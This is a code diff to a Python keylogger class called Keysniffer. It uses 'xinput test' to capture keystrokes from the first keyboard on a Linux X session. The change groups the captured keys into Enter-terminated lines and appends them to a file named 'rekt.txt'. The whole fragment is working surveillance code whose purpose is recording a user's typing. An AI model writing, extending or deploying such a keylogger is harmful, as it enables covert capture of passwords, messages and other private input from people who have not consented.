@@ -8,7 +8,7 @@ class Keysniffer():
 	def __init__(self, xinput='/usr/bin/xinput'):
 		self.xinput = xinput
 		self.keycodes = []
-		self.outfile = 'rekt.txt'
+		self.outfile = open('rekt.txt', 'a')
 		self.keyboards = self.getKeyboards()
 		self.getKeyCodes()
 	
@@ -164,15 +164,19 @@ class Keysniffer():
 
 		# Call xinput to start sniffing keycodes and pipe its output 
 		keystream = subprocess.Popen((self.xinput, 'test', self.keyboards[0]), 
-				stdout=subprocess.PIPE, 
-				universal_newlines=True)
+									  stdout=subprocess.PIPE, 
+									  universal_newlines=True)
 		
 		# stream_buffer = []
+		kc = ['']
 		for line in keystream.stdout:
-			kc = ['']
 			if "release" in line:
 				kc.append(str(line).strip().split()[-1])
-				print(self.codesToKeys(kc))
+				if kc[-1] == str(enter):
+					res = '+'.join(self.codesToKeys(kc))
+					print(res)
+					self.outfile.write(res)
+					kc = ['']
 			else:
 				continue
 
